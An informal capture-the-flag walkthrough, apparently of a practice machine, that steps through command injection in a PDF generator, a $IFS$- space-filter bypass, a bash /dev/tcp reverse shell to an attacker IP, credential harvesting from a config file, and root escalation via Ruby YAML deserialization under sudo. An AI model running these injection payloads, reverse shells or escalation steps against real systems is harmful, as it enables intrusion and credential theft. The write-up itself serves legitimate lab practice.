|
-do da nmap shit on port 80
|
-pdf generator
|
-start up a python3 http.server 80 cause you need to have a available http server to make the requests work on the pdf generator

note: using nc -lnvp 80 is pein cause nc can handle only one connection and need to keep doing it everytiem
|
-pdf generator vulnerable to rce using http://yer own machine ip/$(uname) or $(whoami)
-but pein is it haets spaces so you can use $IFS for spaces but pein arises when you want to terminate the $IFS variable after the $IFS itself so you can use $IFS$- cause $- will lead to null variable which is not defined
|
-use that to spawn a reverse shell using that url mentioned above liek this bash -c 'bash -i >& /dev/tcp/10.10.14.61/9001 0>&1'
|
-or use that to get a reverse shell binary that you can host on yer own machine and tell it to get it using wget or curl
|
-use the sem shid to run the reverse shell also after getting the reverse shell on to the target machine
|
-reverse shell noiceee
|
-now priv esc tiem
|
-sudo -l tells fuk you no priviledges or any suid binaries for you so pein
|
-go to yer own home using ~
|
-do find . -type f (neat trick to find only files in the current directory)
-you get .bundle/config which is a sus file
|
-cat that and you get username and password for henry
|
-cat ze /etc/passwd henry there also so he not npc noice
|
-ssh into the server using henry's shit
|
-do sudo -l
-and he really not a npc cause he can execute /usr/bin/ruby /opt/update_dependencies.rb as root
note:he can only execute the whole command as root not just ruby which is pein
|
-cat user.txt in henry home for user flag
|
-cant even edit that /opt/update_dependencies.rb file so more pein
|
-move to /dev/shm (some shared memory shit)
|
-ruby deserialization exploit idek what it mean so pein
|
-google ruby deserialization yaml
|
-first link copy paste code you get in that to dependencies.yml
|
-get ruby deserialization code from swisskeyrepo and check the version of ruby is correct or not using ruby -v
|
-and run that command that you can run as root by changing the git_set thingy
|
-change that to what ever command you want to run in our case we just want flag 
|
-it will give fuk ton of errors but look at the top you got the output for id command and you are root
|
-get root flag by doing cat /root/root.txt
